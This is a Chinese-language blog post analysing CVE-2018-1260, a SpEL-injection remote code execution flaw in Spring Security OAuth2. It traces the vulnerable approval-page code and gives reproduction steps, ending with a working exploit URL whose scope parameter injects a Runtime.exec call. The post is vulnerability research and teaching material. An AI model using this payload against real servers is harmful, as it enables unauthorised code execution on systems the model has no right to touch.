<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2018-1260）Spring Security Oauth2 远程代码执行一、漏洞简介二、漏洞影响Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14 三、复现过程">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2018-1260）Spring Security Oauth2 远程代码执行一、漏洞简介二、漏洞影响Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14 三、复现过程">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId35.gif">
<meta property="article:published_time" content="2022-07-08T06:26:04.085Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId25.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Spring Security Oauth/（CVE-2018-1260）Spring Security Oauth2 远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
  <time datetime="2022-07-08T06:26:04.085Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-1260）Spring-Security-Oauth2-远程代码执行"><a href="#（CVE-2018-1260）Spring-Security-Oauth2-远程代码执行" class="headerlink" title="（CVE-2018-1260）Spring Security Oauth2 远程代码执行"></a>（CVE-2018-1260）Spring Security Oauth2 远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先简要补充一下关于OAuth2.0的相关知识。<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId25.png" alt="1.png">以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access<br>token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。</p>
<p>在获得access<br>token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization<br>code）、简化模式（implicit）、密码模式（resource owner password<br>credentials）、客户端模式（client<br>credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数<code>scope</code>，这个参数用于表示客户端申请的权限的范围。</p>
<p>，根据<a target="_blank" rel="noopener" href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html">官方文档</a>，在spring-security-oauth的默认配置中scope参数默认为空：</p>
<pre><code>scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope.
</code></pre>
<p>为明白起见，我们在demo中将其清楚写出：</p>
<pre><code>clients.inMemory()
        .withClient(&quot;client&quot;)
        .authorizedGrantTypes(&quot;authorization_code&quot;)
        .scopes();
</code></pre>
<p>接着开始正式分析。当我们访问<code>http://localhost:8080/oauth/authorize</code>重定向至<code>http://localhost:8080/login</code>并完成login后程序流程到达org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码：</p>
<pre><code>@RequestMapping(value = &quot;/oauth/authorize&quot;)
public ModelAndView authorize(Map&lt;String, Object&gt; model, @RequestParam Map&lt;String, String&gt; parameters,
        SessionStatus sessionStatus, Principal principal) &#123;

    // Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should
    // query off of the authorization request instead of referring back to the parameters map. The contents of the
    // parameters map will be stored without change in the AuthorizationRequest object once it is created.
    AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters);

    try &#123;
        ...
        // We intentionally only validate the parameters requested by the client (ignoring any data that may have
        // been added to the request by the manager).
        oauth2RequestValidator.validateScope(authorizationRequest, client);
        ...

        // Place auth request into the model so that it is stored in the session
        // for approveOrDeny to use. That way we make sure that auth request comes from the session,
        // so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session.
        model.put(&quot;authorizationRequest&quot;, authorizationRequest);

        return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);

    &#125;
    ...
</code></pre>
<p>第115行<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId27.png" alt="2.png">在执行完<code>AuthorizationRequest authorizationRequest = ...</code>后，<code>authorizationRequest</code>代表了要认证的请求，其中包含了众多参数<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId28.png" alt="3.png"></p>
<p>在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行：</p>
<pre><code>// We intentionally only validate the parameters requested by the client (ignoring any data that may have
// been added to the request by the manager).
oauth2RequestValidator.validateScope(authorizationRequest, client);
</code></pre>
<p>在这里将对<code>scope</code>参数进行验证。跟入<code>validateScope</code>到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19</p>
<pre><code>public class DefaultOAuth2RequestValidator implements OAuth2RequestValidator &#123;

    public void validateScope(AuthorizationRequest authorizationRequest, ClientDetails client) throws InvalidScopeException &#123;
        validateScope(authorizationRequest.getScope(), client.getScope());
    &#125;
    ...
&#125;
</code></pre>
<p>继续跟入<code>validateScope</code>，至<br>org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28</p>
<pre><code>private void validateScope(Set&lt;String&gt; requestScopes, Set&lt;String&gt; clientScopes) &#123;

    if (clientScopes != null &amp;&amp; !clientScopes.isEmpty()) &#123;
        for (String scope : requestScopes) &#123;
            if (!clientScopes.contains(scope)) &#123;
                throw new InvalidScopeException(&quot;Invalid scope: &quot; + scope, clientScopes);
            &#125;
        &#125;
    &#125;
    
    if (requestScopes.isEmpty()) &#123;
        throw new InvalidScopeException(&quot;Empty scope (either the client or the user is not allowed the requested scopes)&quot;);
    &#125;
&#125;
</code></pre>
<p>首先检查<code>clientScopes</code>，这个<code>clientScopes</code>即我们在前面configure中配置的<code>.scopes();</code>，倘若不为空，则进行白名单检查。举个例子，如果前面配置<code>.scopes(&quot;chybeta&quot;);</code>，则传入<code>requestScopes</code>必须为<code>chybeta</code>，否则会直接抛出异常<code>Invalid scope:xxx</code>。但由于此处查<code>clientScopes</code>为空值，则接下来仅仅做了<code>requestScopes.isEmpty()</code>的检查并且通过。</p>
<p>在完成了各项检查和配置后，在<code>authorize</code>函数的最后执行：</p>
<pre><code>return getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);
</code></pre>
<p>回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入<code>getUserApprovalPageResponse</code><br>至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241：<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId29.png" alt="4.png"></p>
<p>生成对应的model和view，之后将会forward到/oauth/confirm_access。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20</p>
<p>public class WhitelabelApprovalEndpoint {@RequestMapping(&quot;/oauth/confirm_access&quot;)public ModelAndView getAccessConfirmation(Map&lt;String, Object&gt; model,<br>HttpServletRequest request) throws Exception {String template = createTemplate(model, request);if (request.getAttribute(&quot;_csrf&quot;) != null) {model.put(&quot;_csrf&quot;, request.getAttribute(&quot;_csrf&quot;));}return new ModelAndView(new SpelView(template), model);}...}跟入createTemplate，第29行：</p>
<p>protected String createTemplate(Map&lt;String, Object&gt; model,<br>HttpServletRequest request) {String template = TEMPLATE;if (model.containsKey(&quot;scopes&quot;) || request.getAttribute(&quot;scopes&quot;)<br>!= null) {template = template.replace(&quot;%scopes%&quot;, createScopes(model,<br>request)).replace(&quot;%denial%&quot;, &quot;&quot;);}...return template;}跟入createScopes，第46行：<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.png" alt="5.png"></p>
<p>这里获取到了<code>scopes</code>，并且通过for循环生成对应的<code>builder</code>，其实就是html和一些标签等，最后返回的即<code>builder.toString()</code>,其值如下:</p>
<pre><code>&lt;ul&gt;&lt;li&gt;&lt;div&gt;scope.$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;: &lt;input type=&#39;radio&#39; name=&#39;scope.$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;&#39; value=&#39;true&#39;&gt;Approve&lt;/input&gt; &lt;input type=&#39;radio&#39; name=&#39;scope.$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;&#39; value=&#39;false&#39; checked&gt;Deny&lt;/input&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;
</code></pre>
<p><code>createScopes</code>结束后将会把上述<code>builder.toString()</code>拼接到<code>template</code>中。<code>createTemplate</code>结束后，在<code>getAccessConfirmation</code>的最后：</p>
<pre><code>return new ModelAndView(new SpelView(template), model);
</code></pre>
<p>根据<code>template</code>生成对应的<code>SpelView</code>对象，这是其构造函数：<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId31.png" alt="6.png">此后在页面渲染的过程中，将会执行页面中的Spel表达式<code>$&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#125;</code>从而造成代码执行。</p>
<p><img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId32.png" alt="7.png"></p>
<p>所以综上所述，这个任意代码执行的利用条件实在”苛刻”：</p>
<ol>
<li> 需要<code>scopes</code>没有配置白名单，否则直接<code>Invalid scope:xxx</code>。不过大部分OAuth都会限制授权的范围，即指定scopes。</li>
<li>使用了默认的Approval<br> Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。</li>
</ol>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>利用github上已有的demo：</p>
<pre><code>git clone https://github.com/wanghongfei/spring-security-oauth2-example.git
</code></pre>
<p>确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10进入spring-security-oauth2-example，修改<br>cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:</p>
<pre><code>@Override
public void configure(ClientDetailsServiceConfigurer clients) throws Exception &#123;
   clients.inMemory()
            .withClient(&quot;client&quot;)
            .authorizedGrantTypes(&quot;authorization_code&quot;)
            .scopes();
&#125;
</code></pre>
<p>根据<a target="_blank" rel="noopener" href="https://github.com/wanghongfei/spring-security-oauth2-example.git">spring-security-oauth2-example</a>创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。</p>
<p>访问：</p>
<pre><code>http://www.0-sec.org:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.github.com/chybeta&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D
</code></pre>
<p>会重定向到login页面，随意输入username和password，点击login，触发payload。<img src="/resource/(CVE-2018-1260)SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId35.gif" alt="3.gif"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" data-id="cl5c2qvvq00h7y8v1bgt367yq" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Spring%20Security%20Oauth/%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>